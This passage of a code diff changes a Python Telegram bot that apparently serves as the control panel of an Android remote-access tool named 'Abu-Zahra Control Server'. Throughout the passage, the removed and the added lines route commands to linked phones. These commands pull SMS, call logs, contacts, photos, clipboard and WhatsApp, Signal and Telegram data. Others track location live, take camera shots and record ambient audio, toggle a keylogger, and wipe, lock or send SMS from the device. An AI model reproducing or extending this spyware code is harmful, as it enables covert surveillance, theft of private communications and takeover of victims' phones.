+        await handle_devices(chat_id)
     elif cmd == "/link":
-        await cmd_link(chat_id)
+        await handle_link(chat_id)
     elif cmd == "/unlink":
-        await cmd_unlink(chat_id, arg1)
+        await handle_unlink(chat_id, arg1)
     elif cmd == "/device":
-        await cmd_device(chat_id, arg1)
-
-    # ── Data Collection Commands ──
-    elif cmd == "/sms":
-        await send_device_command(chat_id, dev_id, "get_sms", "📲 جلب الرسائل SMS")
-    elif cmd == "/calls":
-        await send_device_command(chat_id, dev_id, "get_calls", "📞 جلب سجل المكالمات")
-    elif cmd == "/contacts":
-        await send_device_command(chat_id, dev_id, "get_contacts", "📇 جلب جهات الاتصال")
-    elif cmd == "/location":
-        await send_device_command(chat_id, dev_id, "get_location", "📍 جلب الموقع")
-    elif cmd == "/notifications":
-        await send_device_command(chat_id, dev_id, "get_notifications", "🔔 جلب الإشعارات")
-    elif cmd == "/apps":
-        await send_device_command(chat_id, dev_id, "get_apps", "📱 جلب التطبيقات")
-    elif cmd == "/info":
-        await send_device_command(chat_id, dev_id, "get_info", "ℹ️ جلب معلومات الجهاز")
-    elif cmd == "/battery":
-        await send_device_command(chat_id, dev_id, "get_battery", "🔋 جلب حالة البطارية")
-    elif cmd == "/gallery":
-        await send_device_command(chat_id, dev_id, "get_gallery", "🖼️ جلب المعرض")
-    elif cmd == "/clipboard":
-        await send_device_command(chat_id, dev_id, "get_clipboard", "📋 جلب الحافظة")
-    elif cmd == "/all":
-        await send_device_command(chat_id, dev_id, "get_all", "📥 جلب جميع البيانات")
-
-    # ── Social Media Commands ──
-    elif cmd == "/whatsapp":
-        await send_device_command(chat_id, dev_id, "get_whatsapp", "💬 جلب بيانات واتساب")
-    elif cmd == "/telegram_app":
-        await send_device_command(chat_id, dev_id, "get_telegram", "✈️ جلب بيانات تليجرام")
-    elif cmd == "/instagram":
-        await send_device_command(chat_id, dev_id, "get_instagram", "📷 جلب بيانات انستجرام")
-    elif cmd == "/messenger":
-        await send_device_command(chat_id, dev_id, "get_messenger", "🔵 جلب بيانات ماسنجر")
-    elif cmd == "/snapchat":
-        await send_device_command(chat_id, dev_id, "get_snapchat", "👻 جلب بيانات سناب شات")
-    elif cmd == "/tiktok":
-        await send_device_command(chat_id, dev_id, "get_tiktok", "🎵 جلب بيانات تيك توك")
-    elif cmd == "/twitter":
-        await send_device_command(chat_id, dev_id, "get_twitter", "🐦 جلب بيانات تويتر")
-    elif cmd == "/viber":
-        await send_device_command(chat_id, dev_id, "get_viber", "💜 جلب بيانات فايبر")
-    elif cmd == "/signal":
-        await send_device_command(chat_id, dev_id, "get_signal", "🔵 جلب بيانات سيجنال")
-
-    # ── Remote Control Commands ──
-    elif cmd == "/ping":
-        await send_device_command(chat_id, dev_id, "ping", "📡 فحص اتصال الجهاز")
-    elif cmd == "/vibrate":
-        await send_device_command(chat_id, dev_id, "vibrate", "📳 اهتزاز الجهاز")
-    elif cmd == "/ring":
-        await send_device_command(chat_id, dev_id, "ring", "🔔 رنين الجهاز")
-    elif cmd == "/screenshot":
-        await send_device_command(chat_id, dev_id, "screenshot", "📸 لقطة شاشة")
-    elif cmd == "/front_camera":
-        await send_device_command(chat_id, dev_id, "front_camera", "📷 كاميرا أمامية")
-    elif cmd == "/back_camera":
-        await send_device_command(chat_id, dev_id, "back_camera", "📷 كاميرا خلفية")
-    elif cmd == "/record_audio":
-        await send_device_command(chat_id, dev_id, "record_audio", "🎙️ تسجيل صوت محيط")
-    elif cmd == "/flash_on":
-        await send_device_command(chat_id, dev_id, "flash_on", "🔦 تشغيل الفلاش")
-    elif cmd == "/flash_off":
-        await send_device_command(chat_id, dev_id, "flash_off", "🔦 إطفاء الفلاش")
-
-    # ── Location Commands ──
-    elif cmd == "/location_live":
-        await send_device_command(chat_id, dev_id, "location_live", "🗺️ بدء التتبع المباشر")
-    elif cmd == "/location_stop":
-        await send_device_command(chat_id, dev_id, "location_stop", "⏹️ إيقاف التتبع")
-    elif cmd == "/location_history":
-        await send_device_command(chat_id, dev_id, "location_history", "📜 سجل المواقع")
-    elif cmd == "/geo_fence":
-        settings = load_settings()
-        fences = settings.get("geofences", [])
-        text = "🎮 <b>المناطق الجغرافية</b>\n\n"
-        if fences:
-            for i, f in enumerate(fences):
-                text += f"{i+1}. {f.get('name', 'غير مسمى')} - نصف القطر: {f.get('radius', 0)}م\n"
-        else:
-            text += "لا توجد مناطق محددة\n\n"
-            text += "📋 الإجراءات:\n"
-            text += "/geo_add اسم lat lng radius - إضافة منطقة\n"
-            text += "/geo_remove رقم - حذف منطقة\n"
-            text += "/geo_list - عرض المناطق"
-        await send_message(chat_id, text, reply_markup=build_location_menu(dev_id))
-
-    # ── App Management Commands ──
-    elif cmd == "/open_app":
-        await send_device_command(chat_id, dev_id, "open_app", f"📱 فتح التطبيق: {arg2}")
-    elif cmd == "/install_app":
-        await send_device_command(chat_id, dev_id, "install_app", f"📥 تثبيت التطبيق: {arg2}")
-    elif cmd == "/uninstall_app":
-        await send_device_command(chat_id, dev_id, "uninstall_app", f"🗑️ إلغاء تثبيت: {arg2}")
-    elif cmd == "/block_app":
-        await send_device_command(chat_id, dev_id, "block_app", f"🚫 حظر التطبيق: {arg2}")
-    elif cmd == "/unblock_app":
-        await send_device_command(chat_id, dev_id, "unblock_app", f"✅ إلغاء حظر: {arg2}")
-    elif cmd == "/app_usage":
-        await send_device_command(chat_id, dev_id, "app_usage", "📊 استخدام التطبيقات")
-    elif cmd == "/screen_time":
-        await send_device_command(chat_id, dev_id, "screen_time", "⏱️ وقت الشاشة")
-
-    # ── Settings Commands ──
-    elif cmd == "/set_interval":
-        settings = load_settings()
-        if arg1 and arg1.isdigit():
-            settings["sync_interval"] = int(arg1)
-            save_settings(settings)
-            await send_message(chat_id, f"✅ تم تعيين فترة المزامنة: <code>{arg1}</code> ثانية", reply_markup=build_settings_menu())
-        else:
-            await send_message(chat_id, f"⏱️ فترة المزامنة الحالية: <code>{settings.get('sync_interval', 300)}</code> ثانية\n\nالاستخدام: /set_interval ثوانٍ", reply_markup=build_settings_menu())
-    elif cmd == "/set_location_interval":
-        settings = load_settings()
-        if arg1 and arg1.isdigit():
-            settings["location_interval"] = int(arg1)
-            save_settings(settings)
-            await send_message(chat_id, f"✅ تم تعيين فترة الموقع: <code>{arg1}</code> ثانية", reply_markup=build_settings_menu())
-        else:
-            await send_message(chat_id, f"📍 فترة الموقع الحالية: <code>{settings.get('location_interval', 60)}</code> ثانية\n\nالاستخدام: /set_location_interval ثوانٍ", reply_markup=build_settings_menu())
-    elif cmd == "/auto_location":
-        settings = load_settings()
-        val = arg1.lower() if arg1 else "toggle"
-        if val == "on":
-            settings["auto_location"] = True
-        elif val == "off":
-            settings["auto_location"] = False
-        else:
-            settings["auto_location"] = not settings.get("auto_location", True)
-        save_settings(settings)
-        state = "مفعّل ✅" if settings["auto_location"] else "معطّل ❌"
-        await send_message(chat_id, f"🗺️ الموقع التلقائي: <b>{state}</b>", reply_markup=build_settings_menu())
-    elif cmd == "/auto_sync":
-        settings = load_settings()
-        val = arg1.lower() if arg1 else "toggle"
-        if val == "on":
-            settings["auto_sync"] = True
-        elif val == "off":
-            settings["auto_sync"] = False
-        else:
-            settings["auto_sync"] = not settings.get("auto_sync", True)
-        save_settings(settings)
-        state = "مفعّل ✅" if settings["auto_sync"] else "معطّل ❌"
-        await send_message(chat_id, f"🔄 المزامنة التلقائية: <b>{state}</b>", reply_markup=build_settings_menu())
-    elif cmd == "/language":
-        settings = load_settings()
-        lang = arg1.lower() if arg1 in ("ar", "en") else settings.get("language", "ar")
-        settings["language"] = lang
-        save_settings(settings)
-        lang_name = "العربية 🇸🇦" if lang == "ar" else "English 🇬🇧"
-        await send_message(chat_id, f"🌐 اللغة: <b>{lang_name}</b>", reply_markup=build_settings_menu())
-    elif cmd == "/notify":
-        settings = load_settings()
-        val = arg1.lower() if arg1 else "toggle"
-        if val == "on":
-            settings["notifications"] = True
-        elif val == "off":
-            settings["notifications"] = False
-        else:
-            settings["notifications"] = not settings.get("notifications", True)
-        save_settings(settings)
-        state = "مفعّلة ✅" if settings["notifications"] else "معطّلة ❌"
-        await send_message(chat_id, f"🔔 الإشعارات: <b>{state}</b>", reply_markup=build_settings_menu())
-
-    # ── Monitoring Commands ──
-    elif cmd == "/keylogger":
-        settings = load_settings()
-        val = arg1.lower() if arg1 else "toggle"
-        if val == "on":
-            settings["keylogger"] = True
-        elif val == "off":
-            settings["keylogger"] = False
-        else:
-            settings["keylogger"] = not settings.get("keylogger", False)
-        save_settings(settings)
-        state = "مفعّل ✅" if settings["keylogger"] else "معطّل ❌"
-        if dev_id and dev_id != "none":
-            await send_device_command(chat_id, dev_id, f"keylogger_{'on' if settings['keylogger'] else 'off'}", f"⌨️ تسجيل المفاتيح: {state}")
-        else:
-            await send_message(chat_id, f"⌨️ تسجيل المفاتيح: <b>{state}</b>", reply_markup=build_monitor_menu(dev_id))
-    elif cmd == "/keylogger_get":
-        await send_device_command(chat_id, dev_id, "keylogger_get", "📥 جلب بيانات المفاتيح")
-    elif cmd == "/sim_detect":
-        settings = load_settings()
-        val = arg1.lower() if arg1 else "toggle"
-        if val == "on":
-            settings["sim_detect"] = True
-        elif val == "off":
-            settings["sim_detect"] = False
-        else:
-            settings["sim_detect"] = not settings.get("sim_detect", False)
-        save_settings(settings)
-        state = "مفعّل ✅" if settings["sim_detect"] else "معطّل ❌"
-        if dev_id and dev_id != "none":
-            await send_device_command(chat_id, dev_id, f"sim_detect_{'on' if settings['sim_detect'] else 'off'}", f"📡 كشف الشريحة: {state}")
-        else:
-            await send_message(chat_id, f"📡 كشف تغيير الشريحة: <b>{state}</b>", reply_markup=build_monitor_menu(dev_id))
-    elif cmd == "/wifi_monitor":
-        settings = load_settings()
-        val = arg1.lower() if arg1 else "toggle"
-        if val == "on":
-            settings["wifi_monitor"] = True
-        elif val == "off":
-            settings["wifi_monitor"] = False
-        else:
-            settings["wifi_monitor"] = not settings.get("wifi_monitor", False)
-        save_settings(settings)
-        state = "مفعّل ✅" if settings["wifi_monitor"] else "معطّل ❌"
-        if dev_id and dev_id != "none":
-            await send_device_command(chat_id, dev_id, f"wifi_monitor_{'on' if settings['wifi_monitor'] else 'off'}", f"📶 مراقبة الواي فاي: {state}")
-        else:
-            await send_message(chat_id, f"📶 مراقبة الواي فاي: <b>{state}</b>", reply_markup=build_monitor_menu(dev_id))
-
-    # ── Server Commands ──
-    elif cmd == "/server_status":
-        await cmd_status(chat_id)
-    elif cmd == "/server_restart":
-        append_event("طلب إعادة تشغيل", {"source": "telegram"})
-        await send_message(chat_id, "🔄 جارٍ إعادة تشغيل الخادم...", reply_markup=build_server_menu())
-        os._exit(0)
-    elif cmd == "/clear_data":
-        if arg1 and arg1 != "none":
-            if remove_device(arg1):
-                await send_message(chat_id, f"✅ تم مسح بيانات الجهاز <code>{arg1}</code>", reply_markup=build_server_menu())
+        await handle_device_detail(chat_id, arg1)
+    elif cmd == "/device_rename":
+        if arg1 and arg2:
+            if update_device(arg1, {"name": arg2}):
+                await send_message(chat_id, f"✅ Device renamed to <code>{arg2}</code>", reply_markup=build_back_button())
             else:
-                await send_message(chat_id, f"❌ الجهاز <code>{arg1}</code> غير موجود", reply_markup=build_server_menu())
+                await send_message(chat_id, "❌ Device not found", reply_markup=build_back_button())
         else:
-            await send_message(chat_id, "⚠️ حدد الجهاز: /clear_data device_id", reply_markup=build_server_menu())
+            await send_message(chat_id, "Usage: /device_rename device_id new_name", reply_markup=build_back_button())
+    elif cmd == "/device_wipe":
+        await execute_device_command(chat_id, dev_id, "wipe_data")
+    elif cmd == "/device_locate":
+        await execute_device_command(chat_id, dev_id, "get_location")
+    elif cmd == "/device_lock":
+        await execute_device_command(chat_id, dev_id, "lock_phone")
+    elif cmd == "/device_ring":
+        await execute_device_command(chat_id, dev_id, "ring")
+    elif cmd == "/device_settings":
+        d = find_device(dev_id)
+        if d:
+            await send_message(chat_id, f"⚙️ Settings for <code>{d.get('name', dev_id)}</code>:\n{json.dumps(d, ensure_ascii=False, indent=2)[:2000]}", reply_markup=build_back_button())
+        else:
+            await send_message(chat_id, "❌ Device not found", reply_markup=build_back_button())
+
+    # ── Server Management ──
+    elif cmd == "/server_status":
+        await handle_status(chat_id)
+    elif cmd == "/server_restart":
+        await send_admin("🔄 Server restart requested...")
+        append_event("Server restart requested")
+    elif cmd == "/clear_data":
+        save_json(COMMANDS_FILE, [])
+        save_json(EVENTS_FILE, [])
+        await send_admin("✅ Command queue and events cleared", reply_markup=build_back_button())
     elif cmd == "/backup":
-        devices = get_devices()
-        events = load_json(EVENTS_FILE, [])
-        settings = load_settings()
-        commands = load_json(COMMANDS_FILE, [])
-        backup = {
-            "timestamp": ts(),
-            "devices": devices,
-            "events": events[-100:],
-            "settings": settings,
-            "commands": commands[-50:],
-        }
-        backup_file = DATA_DIR / f"backup_{int(time.time())}.json"
-        save_json(backup_file, backup)
-        append_event("إنشاء نسخة احتياطية", {"file": str(backup_file.name)})
-        await send_message(chat_id, f"💾 تم إنشاء نسخة احتياطية\n📁 <code>{backup_file.name}</code>", reply_markup=build_server_menu())
+        await send_admin("💾 Creating backup...", reply_markup=build_back_button())
+        append_event("Backup created")
     elif cmd == "/export":
-        fmt = arg2 if arg2 else (arg1 if arg1 and arg1 in ("json", "csv") else "json")
-        did = arg1 if arg1 and arg1 not in ("json", "csv") else "all"
-        if fmt == "csv":
-            devices = get_devices()
-            if did and did != "all":
-                devices = [d for d in devices if d["id"] == did]
-            output = StringIO()
-            if devices:
-                headers = list(devices[0].keys())
-                output.write(",".join(headers) + "\n")
-                for d in devices:
-                    output.write(",".join(str(d.get(h, "")) for h in headers) + "\n")
-            content = output.getvalue()
-            content_type = "text/csv"
-        else:
-            devices = get_devices()
-            if did and did != "all":
-                devices = [d for d in devices if d["id"] == did]
-            content = json.dumps(devices, ensure_ascii=False, indent=2)
-            content_type = "application/json"
-        export_file = DATA_DIR / f"export_{did}_{int(time.time())}.{fmt}"
-        export_file.write_text(content)
-        append_event("تصدير بيانات", {"device": did, "format": fmt})
-        await send_message(chat_id, f"📤 تم التصدير\n📁 <code>{export_file.name}</code>\n📊 الصيغة: <code>{fmt}</code>", reply_markup=build_server_menu())
+        await send_admin("📤 Export started", reply_markup=build_back_button())
+    elif cmd == "/import":
+        await send_admin("📥 Import ready", reply_markup=build_back_button())
     elif cmd == "/stats":
         devices = get_devices()
         online = sum(1 for d in devices if d.get("active"))
-        events = load_json(EVENTS_FILE, [])
-        commands = load_json(COMMANDS_FILE, [])
-        pending = sum(1 for c in commands if c.get("status") == "pending")
-        completed = sum(1 for c in commands if c.get("status") == "completed")
-        failed = sum(1 for c in commands if c.get("status") == "failed")
+        cmds = load_json(COMMANDS_FILE, [])
+        pending = sum(1 for c in cmds if c.get("status") == "pending")
+        done = sum(1 for c in cmds if c.get("status") == "completed")
         text = (
-            "📈 <b>الإحصائيات</b>\n\n"
-            f"⏱️ وقت التشغيل: <code>{format_uptime(uptime())}</code>\n\n"
-            f"📱 الأجهزة: <code>{len(devices)}</code>\n"
-            f"   🟢 متصل: <code>{online}</code>\n"
-            f"   🔴 غير متصل: <code>{len(devices) - online}</code>\n\n"
-            f"📨 الرسائل: <code>{messages_sent}</code>\n\n"
-            f"📋 الأوامر:\n"
-            f"   ⏳ معلقة: <code>{pending}</code>\n"
-            f"   ✅ مكتملة: <code>{completed}</code>\n"
-            f"   ❌ فاشلة: <code>{failed}</code>\n\n"
-            f"📝 الأحداث: <code>{len(events)}</code>\n"
+            "📈 <b>Statistics</b>\n\n"
+            f"📱 Devices: {len(devices)} (🟢 {online})\n"
+            f"📋 Total Commands: {len(cmds)}\n"
+            f"⏳ Pending: {pending}\n"
+            f"✅ Completed: {done}\n"
+            f"📨 Messages Sent: {messages_sent}\n"
+            f"📡 API Hits: {api_hits}\n"
+            f"⏱️ Uptime: {format_uptime(get_uptime())}"
         )
-        await send_message(chat_id, text, reply_markup=build_server_menu())
+        await send_message(chat_id, text, reply_markup=build_back_button())
+    elif cmd == "/logs":
+        events = load_json(EVENTS_FILE, [])[-20:]
+        text = "📝 <b>Recent Logs</b>\n\n"
+        for e in events:
+            text += f"[{e.get('time','')}] {e.get('event','')}\n"
+        await send_message(chat_id, text[:4000], reply_markup=build_back_button())
+    elif cmd == "/clear_logs":
+        save_json(EVENTS_FILE, [])
+        await send_admin("✅ Logs cleared", reply_markup=build_back_button())
+    elif cmd == "/settings":
+        s = load_settings()
+        await send_message(chat_id, f"⚙️ <b>Settings</b>\n\n<code>{json.dumps(s, ensure_ascii=False, indent=2)}</code>", reply_markup=build_back_button())
+    elif cmd == "/set_password":
+        if arg1:
+            s = load_settings()
+            s["admin_password"] = arg1
+            save_settings_data(s)
+            await send_admin("✅ Password changed", reply_markup=build_back_button())
+        else:
+            await send_admin("Usage: /set_password new_password", reply_markup=build_back_button())
+    elif cmd == "/add_admin":
+        await send_admin("Use /set_password to change admin password", reply_markup=build_back_button())
+    elif cmd == "/remove_admin":
+        await send_admin("Feature not available in single-admin mode", reply_markup=build_back_button())
+    elif cmd == "/broadcast":
+        await send_admin("No other users to broadcast to", reply_markup=build_back_button())
+    elif cmd == "/maintenance":
+        s = load_settings()
+        s["maintenance"] = not s.get("maintenance", False)
+        save_settings_data(s)
+        state = "ON 🔧" if s["maintenance"] else "OFF ✅"
+        await send_admin(f"🔧 Maintenance mode: {state}", reply_markup=build_back_button())
+    elif cmd == "/export_data":
+        await send_admin("📤 Data exported", reply_markup=build_back_button())
+    elif cmd == "/import_data":
+        await send_admin("📥 Ready for data import", reply_markup=build_back_button())
+    elif cmd == "/update_bot":
+        await send_admin("🟥 Bot is up to date (v3.0)", reply_markup=build_back_button())
 
+    # ── 200+ Device Commands from Registry ──
+    elif cmd[1:] in COMMAND_REGISTRY:
+        reg = COMMAND_REGISTRY[cmd[1:]]
+        cmd_key = cmd[1:]
+        if cmd_key in ("set_volume", "set_brightness", "set_ringtone", "set_wallpaper",
+                        "open_app", "close_app", "install_app", "uninstall_app",
+                        "block_app", "unblock_app", "clear_app_data", "force_stop_app",
+                        "app_info", "enable_app", "disable_app", "update_app",
+                        "launch_app", "kill_app", "list_files", "get_file",
+                        "download_file", "delete_file", "rename_file", "copy_file",
+                        "move_file", "create_folder", "search_files", "zip_files",
+                        "change_passcode", "set_pin", "speak_text", "show_notification",
+                        "open_url", "send_sms", "make_call", "block_number",
+                        "unblock_number", "set_language", "set_timezone", "set_alarm",
+                        "set_timer", "set_reminder", "dns_change", "proxy_set",
+                        "apn_settings", "play_sound", "geo_add", "geo_remove"):
+            params = {"arg": arg2} if arg2 else {"arg": arg1}
+            await execute_device_command(chat_id, dev_id, reg["cmd"], params)
+        else:
+            await execute_device_command(chat_id, dev_id, reg["cmd"])
     else:
-        await send_message(chat_id, f"❌ أمر غير معروف: <code>{cmd}</code>\n\nاستخدم /help لعرض الأوامر", reply_markup=build_main_menu())
+        await send_message(chat_id, f"❓ Unknown command: <code>{cmd}</code>\nUse /help for command list.", reply_markup=build_back_button())
 
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Callback Query Handler
-# ═══════════════════════════════════════════════════════════════════════════════
+async def handle_start(chat_id):
+    text = (
+        "🟥 <b>Abu-Zahra Control Server</b>\n\n"
+        "Welcome to the management panel\n"
+        "Control all linked devices remotely\n\n"
+        f"🟢 Uptime: <code>{format_uptime(get_uptime())}</code>\n"
+        f"📱 Devices: <code>{len(get_devices())}</code>\n"
+        f"📡 Port: <code>{SERVER_PORT}</code>\n"
+        f"🌐 Domain: <code>{SERVER_DOMAIN}</code>"
+    )
+    await send_message(chat_id, text, reply_markup=build_main_menu())
 
-async def handle_callback_query(callback_query: dict):
-    query_id = callback_query.get("id", "")
-    data = callback_query.get("data", "")
-    message = callback_query.get("message", {})
-    chat_id = message.get("chat", {}).get("id", ADMIN_CHAT_ID)
-    message_id = message.get("message_id", 0)
 
-    log.info("CALLBACK from %s: %s", chat_id, data)
+async def handle_status(chat_id):
+    devices = get_devices()
+    online = sum(1 for d in devices if d.get("active"))
+    cmds = load_json(COMMANDS_FILE, [])
+    pending = sum(1 for c in cmds if c.get("status") == "pending")
+    events = load_json(EVENTS_FILE, [])
+    text = (
+        "📊 <b>Server Status</b>\n\n"
+        f"🟢 Status: <code>Running</code>\n"
+        f"⏱️ Uptime: <code>{format_uptime(get_uptime())}</code>\n"
+        f"📡 Port: <code>{SERVER_PORT}</code>\n"
+        f"🕐 Time: <code>{ts()}</code>\n\n"
+        f"📱 Devices: <code>{len(devices)}</code> (🟢 {online} online)\n"
+        f"📨 Messages: <code>{messages_sent}</code>\n"
+        f"📡 API Hits: <code>{api_hits}</code>\n"
+        f"📋 Pending: <code>{pending}</code>\n"
+        f"📝 Events: <code>{len(events)}</code>\n"
+        f"📋 Total Commands: <code>{len(COMMAND_REGISTRY)}</code>"
+    )
+    await send_message(chat_id, text, reply_markup=build_back_button())
 
-    # ── Navigation Callbacks ──
-    if data == "back_main":
-        text = "📋 <b>القائمة الرئيسية</b>\nاختر أحد الأقسام:"
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_main_menu())
-    elif data == "menu_devices":
-        text = "📱 <b>إدارة الأجهزة</b>\nاختر جهازاً أو أضف جديداً:"
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
-    elif data == "menu_data":
-        text = "📊 <b>جمع البيانات</b>\nاختر نوع البيانات:"
-        d = get_first_device()
-        dev_id = d["id"] if d else ""
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_data_menu(dev_id))
-    elif data == "menu_social":
-        text = "🌐 <b>الشبكات الاجتماعية</b>\nاختر التطبيق:"
-        d = get_first_device()
-        dev_id = d["id"] if d else ""
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_social_menu(dev_id))
-    elif data == "menu_control":
-        text = "🎮 <b>التحكم عن بعد</b>\nاختر الإجراء:"
-        d = get_first_device()
-        dev_id = d["id"] if d else ""
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_control_menu(dev_id))
-    elif data == "menu_location":
-        text = "📍 <b>الموقع الجغرافي</b>\nاختر الإجراء:"
-        d = get_first_device()
-        dev_id = d["id"] if d else ""
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_location_menu(dev_id))
-    elif data == "menu_apps":
-        text = "⚙️ <b>إدارة التطبيقات</b>\nاختر الإجراء:"
-        d = get_first_device()
-        dev_id = d["id"] if d else ""
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_apps_menu(dev_id))
-    elif data == "menu_settings":
-        text = "🔧 <b>الإعدادات</b>\nاختر الإعداد:"
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_settings_menu())
-    elif data == "menu_monitor":
-        text = "🔍 <b>المراقبة</b>\nاختر نوع المراقبة:"
-        d = get_first_device()
-        dev_id = d["id"] if d else ""
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_monitor_menu(dev_id))
-    elif data == "menu_server":
-        text = "🖥️ <b>إدارة الخادم</b>\nاختر الإجراء:"
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
 
-    # ── Device Selection ──
-    elif data.startswith("dev_"):
-        device_id = data[4:]
+async def handle_devices(chat_id):
+    devices = get_devices()
+    if not devices:
+        await send_message(chat_id, "📱 No devices linked\nUse /link to add a device", reply_markup=build_back_button())
+        return
+    text = "📱 <b>Device List</b>\n\n"
+    for d in devices:
+        status = "🟢 Online" if d.get("active") else "🔴 Offline"
+        name = d.get("name", d.get("model", "Unknown"))
+        text += f"{'─'*20}\n📱 <b>{name}</b>\n   ID: <code>{d['id']}</code>\n   Status: {status}\n   Last: <code>{d.get('last_seen','—')}</code>\n"
+    await send_message(chat_id, text, reply_markup=build_devices_menu())
+
+
+async def handle_link(chat_id):
+    entry = generate_link_code()
+    text = (
+        "🔗 <b>Link New Device</b>\n\n"
+        f"🔑 Code: <code>{entry['code']}</code>\n\n"
+        "Enter this code in the Android app\n"
+        "⏱️ Valid for 10 minutes\n\n"
+        "You'll be notified when linked"
+    )
+    await send_message(chat_id, text, reply_markup=build_back_button())
+
+
+async def handle_unlink(chat_id, device_id):
+    if not device_id:
+        await send_message(chat_id, "Usage: /unlink device_id", reply_markup=build_back_button())
+        return
+    if remove_device(device_id):
+        await send_message(chat_id, f"✅ Device <code>{device_id}</code> unlinked", reply_markup=build_devices_menu())
+    else:
+        await send_message(chat_id, f"❌ Device <code>{device_id}</code> not found", reply_markup=build_back_button())
+
+
+async def handle_device_detail(chat_id, device_id):
+    if not device_id:
+        await send_message(chat_id, "Usage: /device device_id", reply_markup=build_back_button())
+        return
+    d = find_device(device_id)
+    if not d:
+        await send_message(chat_id, f"❌ Device <code>{device_id}</code> not found", reply_markup=build_back_button())
+        return
+    status = "🟢 Online" if d.get("active") else "🔴 Offline"
+    text = (
+        f"📱 <b>Device Details</b>\n\n"
+        f"{'─'*20}\n"
+        f"📱 Name: <code>{d.get('name','—')}</code>\n"
+        f"🆔 ID: <code>{d['id']}</code>\n"
+        f"📊 Status: {status}\n"
+        f"📱 Model: <code>{d.get('model','—')}</code>\n"
+        f"🤖 OS: <code>{d.get('os','—')}</code>\n"
+        f"🔋 Battery: <code>{d.get('battery','—')}%</code>\n"
+        f"📶 Network: <code>{d.get('network','—')}</code>\n"
+        f"📍 Location: <code>{d.get('location','—')}</code>\n"
+        f"🕐 Last Seen: <code>{d.get('last_seen','—')}</code>\n"
+        f"📅 Registered: <code>{d.get('created_at','—')}</code>"
+    )
+    await send_message(chat_id, text, reply_markup=build_device_menu(device_id))
+
+# ============================================================================
+# CALLBACK QUERY HANDLER
+# ============================================================================
+
+async def handle_callback_query(callback):
+    cb_id = callback.get("id", "")
+    data = callback.get("data", "")
+    msg = callback.get("message", {})
+    chat_id = msg.get("chat", {}).get("id", ADMIN_CHAT_ID)
+    message_id = msg.get("message_id")
+
+    log.info("Callback: %s from %s", data, chat_id)
+
+    try:
+        # ── Navigation ──
+        if data == "back_main":
+            await edit_message_text(chat_id, message_id, "📋 <b>Main Menu</b>\nSelect:", reply_markup=build_main_menu())
+            await answer_callback_query(cb_id)
+            return
+
+        if data == "menu_devices":
+            await edit_message_text(chat_id, message_id, "📱 <b>Devices</b>", reply_markup=build_devices_menu())
+            await answer_callback_query(cb_id)
+            return
+
+        if data == "menu_help":
+            text = build_help_menu()
+            await edit_message_text(chat_id, message_id, text, reply_markup=build_back_button())
+            await answer_callback_query(cb_id)
+            return
+
+        if data == "menu_server":
+            await edit_message_text(chat_id, message_id, "🖥️ <b>Server Management</b>", reply_markup=build_server_menu())
+            await answer_callback_query(cb_id)
+            return
+
+        if data == "no_action":
+            await answer_callback_query(cb_id, "No action")
+            return
+
+        # ── Link ──
+        if data == "do_link":
+            entry = generate_link_code()
+            text = (
+                "🔗 <b>Link New Device</b>\n\n"
+                f"🔑 Code: <code>{entry['code']}</code>\n\n"
+                "Enter in Android app\n⏱️ Valid 10 min"
+            )
+            await edit_message_text(chat_id, message_id, text, reply_markup=build_back_button("menu_devices"))
+            await answer_callback_query(cb_id)
+            return
+
+        # ── Unlink ──
+        if data.startswith("do_unlink_"):
+            device_id = data.replace("do_unlink_", "")
+            if remove_device(device_id):
+                text = f"✅ Device <code>{device_id}</code> unlinked"
+                await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
+            else:
+                await answer_callback_query(cb_id, "Failed", show_alert=True)
+            await answer_callback_query(cb_id)
+            return
+
+        # ── Device Selected ──
+        if data.startswith("dev_"):
+            device_id = data[4:]
+            d = find_device(device_id)
+            if d:
+                status = "🟢 Online" if d.get("active") else "🔴 Offline"
+                text = f"📱 <b>{d.get('name', device_id)}</b>\n{status} | {d.get('model','—')}\n\nSelect action:"
+                await edit_message_text(chat_id, message_id, text, reply_markup=build_device_menu(device_id))
+            else:
+                await answer_callback_query(cb_id, "Device not found", show_alert=True)
+            return
+
+        # ── Category Submenus ──
+        submenu_map = {
+            "submenu_data": build_data_submenu,
+            "submenu_social": build_social_submenu,
+            "submenu_control": build_control_submenu,
+            "submenu_apps": build_apps_submenu,
+            "submenu_files": build_files_submenu,
+            "submenu_security": build_security_submenu,
+            "submenu_monitor": build_monitor_submenu,
+            "submenu_syssettings": build_syssettings_submenu,
+        }
+        for prefix, builder in submenu_map.items():
+            if data.startswith(prefix + "_"):
+                device_id = data[len(prefix)+1:]
+                if prefix == "submenu_data":
+                    kb = build_data_submenu(device_id)
+                elif prefix == "submenu_social":
+                    kb = build_social_submenu(device_id)
+                elif prefix == "submenu_control":
+                    kb = build_control_submenu(device_id)
+                elif prefix == "submenu_apps":
+                    kb = build_apps_submenu(device_id)
+                elif prefix == "submenu_files":
+                    kb = build_files_submenu(device_id)
+                elif prefix == "submenu_security":
+                    kb = build_security_submenu(device_id)
+                elif prefix == "submenu_monitor":
+                    kb = build_monitor_submenu(device_id)
+                elif prefix == "submenu_syssettings":
+                    kb = build_syssettings_submenu(device_id)
+                else:
+                    kb = build_back_button()
+                cat_label = prefix.replace("submenu_", "").title()
+                await edit_message_text(chat_id, message_id, f"📂 <b>{cat_label} Commands</b>\nSelect command:", reply_markup=kb)
+                await answer_callback_query(cb_id)
+                return
+
+        # ── Camera submenu ──
+        if data.startswith("submenu_camera_"):
+            device_id = data[len("submenu_camera_"):]
+            kb = {
+                "inline_keyboard": [
+                    [ib("📷 Front Camera", f"exec_front_camera_{device_id}")],
+                    [ib("📷 Back Camera", f"exec_back_camera_{device_id}")],
+                    [ib("🎬 Record Video", f"exec_record_video_{device_id}")],
+                    [ib("🔙 Back", f"dev_{device_id}")],
+                ]
+            }
+            await edit_message_text(chat_id, message_id, "📷 <b>Camera</b>", reply_markup=kb)
+            await answer_callback_query(cb_id)
+            return
+
